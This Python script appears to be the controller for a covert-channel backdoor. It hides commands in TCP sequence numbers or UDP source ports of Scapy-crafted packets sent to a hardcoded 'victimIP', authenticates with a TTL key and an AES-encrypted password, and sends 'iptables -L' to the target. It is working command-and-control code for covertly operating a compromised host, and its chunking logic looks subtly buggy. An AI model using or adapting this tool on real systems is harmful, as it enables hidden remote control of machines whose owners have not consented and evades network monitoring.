from scapy.all import *
from Crypto.Cipher import AES #PiCrypto used for encrypting commands in AES
import uuid #Used to generate UID's


#Inputs
victimIP = "192.168.0.2"
ttlKey = 164
srcPort = 80
dstPort = 8000
encryptionKey = "0123456789abcdef"
IV = "abcdefghijklmnop"
protocol = "TCP"
password = "TEST!"


#Take a command and split it into chunks of desired length
def packetizeCommandData(command,length):
    commandData = ''.join(str(ord(c)) for c in command)
    #convert string to binary
    commandData = bin(int(commandData))[2:]

    #Check the length of the data. If it is > length bits (TCP seq num field)
    #Will need to split into multiple packets
    print str(len(commandData))
    #If it is the proper length, perfect, merely send it back out.
    if(len(commandData) == length ):
        output = []
        output.append(commandData)
        return commandData
    #If command is < length, pad it with 0's
    elif(len(commandData) < length):
        #If the length of the data is less than length, pad it so that it will fit into a packet
        return commandData.zfill(length)
    elif(len(commandData) > length):
        #The amount of rounds we should chunk the data.
        rounds = len(commandData) / length
        #What will be left over after we chunk the length bit chunks
        excess = len(commandData) % length
        print "Rounds is " + str(rounds)
        output = []
        i = 0
        start = 0
        end = 0
        while(i < rounds):
            #print "This is round" + str(i)
            start = i*length
            end = (i*length)+(length - 1)
            output.append(commandData[start:end])
            i = i + 1
        #Get the remainder
        output.append(commandData[(end+1):(end+1+excess)])
        return output


def generateUID():
    uid = uuid.uuid1()
    print 'Made a UID ' + str(uid)
    return str(uid)

def craftCommandPacket(data,protocol,position,total,UID):
    global victimIP
    global ttlKey
    global srcPort
    global dstPort
    global encryptionKey
    global IV
    global password


    print "Crafting packet for # " + str(position) + " / " + str(total)
    if(protocol == "TCP"):
        packet = IP(dst=victimIP, ttl=ttlKey)/TCP(sport=srcPort,dport=dstPort, \
        seq=int(str(data),2))/Raw(load=encrypt(password+"\n"+UID+"\n"+str(position)+":" \
        + str(total)))
    elif(protocol == "UDP"):
        packet = IP(dst=victimIP, ttl=ttlKey)/UDP(sport=int(str(data),2),\
        dport=dstPort)/Raw(load=encrypt(password+"\n"+UID+"\n"+ str(position) + \
         ":"+str(total)))
    return packet

def craftCommandPackets(data,protocol):
    packets = []
    #If the length of the number is larger than what is allowed in one packet, split it
    counter = 0
    #Create a UID to put in every packet, so that we know what session the
    #Packets are part of
    UID = generateUID()
    while (counter < len(data)):
        packets.append(craftCommandPacket(data[counter],protocol,counter+1,len(data),UID))
        counter = counter + 1

    return packets

def encrypt(command):
    global encryptionKey
    global IV
    encryptionKey = encryptionKey
    IV = IV
    encryptor = AES.new(encryptionKey,AES.MODE_CFB,IV=IV)
    return encryptor.encrypt(command)

def sendCommand(protocol,command):
    global victimIP
    global ttlKey
    global srcPort
    global dstPort
    global encryptionKey
    global IV

    #Encrypt the command that the user types in.
    encryptedCommand = encrypt(command);

    #If the user uses to wish TCP to send commands, split the command into 32
    #bit chunks, as they will be stuffed into the sequence number field which
    #is 32 bits in size
    if(protocol == "TCP"):
        binaryDataArray = packetizeCommandData(command,32)
    #If the user uses to wish UDP to send commands, split the command into 16
    #bit chunks, as they will be stuffed into the sequence number field which
    #is 32 bits in size
    elif(protocol == "UDP"):
        binaryDataArray = packetizeCommandData(command,16)

    #A list containing crafted packets ready to send
    packets = craftCommandPackets(binaryDataArray,protocol)

    #Send the command packets
    for packet in packets:
        send(packet)
        pass

#1. Send a command packet
command = "iptables -L"
sendCommand("TCP",command)



#2. Listen for a response connection that will show what port to connect on.
    #"Okay, lets talk. You can communicate with me via TCP on port"
